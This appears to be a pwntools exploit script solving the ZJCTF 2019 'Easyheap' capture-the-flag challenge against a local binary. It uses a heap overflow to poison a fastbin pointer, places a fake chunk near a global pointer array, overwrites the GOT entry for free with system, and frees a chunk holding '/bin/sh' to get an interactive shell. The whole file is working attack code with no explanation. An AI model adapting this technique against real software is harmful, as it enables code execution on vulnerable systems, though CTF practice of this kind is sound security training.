from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_17_ZJCTF_2019_Easyheap')
elf = ELF('./data/bin/heap23_17_ZJCTF_2019_Easyheap')
libc = elf.libc

n2b = lambda x    : str(x).encode()
rv  = lambda x    : p.recv(x)
ru  = lambda s    : p.recvuntil(s)
sd  = lambda s    : p.send(s)
sl  = lambda s    : p.sendline(s)
sn  = lambda n    : sl(n2b(n))
sa  = lambda t, s : p.sendafter(t, s)
sla = lambda t, s : p.sendlineafter(t, s)
sna = lambda t, n : sla(t, n2b(n))
ia  = lambda      : p.interactive()
rop = lambda r    : flat([p64(x) for x in r])

def add(size,content):
    sla(':','1')
    sla(':',str(size))
    sla(':',content)

def edit(idx, content):
    sla(':','2')
    sla(':',str(idx))
    sla(':',str(len(content)))
    sla(':',content)

def free(idx):
    sla(':','3')
    sla(':',str(idx))

add(0x68,b'6');add(0x68,b'6');add(0x68,b'6')#step.1
free(2)#step.2
edit(1,b'/bin/sh\x00'+b'\x00'*0x60+p64(0x71)+p64(0x6020ad))#step.3
add(0x68,b'6');add(0x68,b'6')#step.4
edit(3,b'\x00'*0x23+p64(elf.got['free']))#step.5
edit(0,p64(elf.plt['system']))#step.6
free(1)#step.7
ia()